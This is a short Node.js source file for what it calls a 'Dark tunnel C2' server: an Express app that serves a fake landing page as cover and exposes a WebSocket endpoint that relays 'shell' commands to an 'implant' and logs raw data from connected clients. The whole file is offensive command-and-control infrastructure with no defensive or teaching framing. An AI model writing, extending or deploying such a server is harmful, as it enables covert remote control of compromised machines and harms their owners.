const express = require('express');
const WebSocket = require('ws');
const app = express();
const port = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static('public')); // Serve fake landing page

// WebSocket tunnel endpoint
const wss = new WebSocket.Server({ noServer: true });

wss.on('connection', (ws, req) => {
    console.log('🐙 Dark tunnel connected:', req.socket.remoteAddress);
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            if (msg.type === 'shell') {
                // Forward shell command to implant
                ws.send(JSON.stringify({type: 'cmd', payload: msg.payload}));
            }
        } catch(e) {
            // Raw data passthrough
            console.log('Raw:', data.toString());
        }
    });
    
    ws.on('close', () => {
        console.log('Tunnel disconnected');
    });
});

const server = app.listen(port, '::', () => {  // IPv6 binding
    console.log(`🌐 Dark tunnel C2 listening on [::]:${port}`);
});

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, (ws) => {
        wss.emit('connection', ws, request);
    });
});
